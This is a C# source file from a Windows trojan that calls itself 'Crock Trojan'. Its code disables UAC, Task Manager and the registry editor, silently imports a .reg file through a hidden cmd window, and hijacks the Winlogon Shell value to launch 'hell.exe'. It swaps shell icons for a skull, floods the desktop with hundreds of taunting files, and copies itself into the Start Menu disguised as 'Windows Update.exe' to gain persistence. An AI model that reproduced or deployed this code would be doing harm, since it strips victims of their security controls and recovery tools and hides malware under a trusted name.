using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;

namespace Crock
{
    internal static class Addition
    {
        // Working with the registry
        public static void RegFun()
        {
            const string quote = "\"";
            var combo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                WindowStyle = ProcessWindowStyle.Hidden,
                Arguments = @"/k regedit /s " + quote + @"C:\Program Files\Temp\disctrl.reg" + quote + " && exit"
            };
            Process.Start(combo);
            var keyUac = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            keyUac.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
            var disableTasks = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            disableTasks.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            var folder = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons");
            folder.SetValue("3", "C:\\Program Files\\Temp\\skull_real_ico.ico", RegistryValueKind.String);
            var folder2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons");
            folder2.SetValue("4", "C:\\Program Files\\Temp\\skull_real_ico.ico", RegistryValueKind.String);
            var explorer = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            explorer.SetValue("Shell", "explorer.exe, C:\\Program Files\\Temp\\hell.exe", RegistryValueKind.String);
            var disableRegistr = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            disableRegistr.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
        }

        // Lots of junk files on desktop
        public static void TrashDesktop()
        {
            var desktopFiles = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            File.WriteAllText(desktopFiles + @"\POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES.txt",
                "WELCOME TO CROCK TROJAN." + Environment.NewLine + "Try to kill me if its possible for you." + Environment.NewLine + "You have only 6 minutes." + Environment.NewLine + "" + Environment.NewLine + "GOOD LUCK.");
           
            for (var s = 1; s < 300; s++) 
            {
                File.Copy(desktopFiles + @"\POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES.txt", 
                    desktopFiles + $"\\POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES({s}).txt");
            }
        }

        // Check for adding to autorun
        public static bool IsInstalledAr()
        {
            return File.Exists($"{Environment.GetFolderPath(Environment.SpecialFolder.StartMenu)}\\Windows Update.exe");
        }

        // Addition to auto start
        public static void InstallAr()
        {
            File.Copy(Misc.MyLocation(), $"{Environment.GetFolderPath(Environment.SpecialFolder.StartMenu)}\\Windows Update.exe");
        }
    }
}
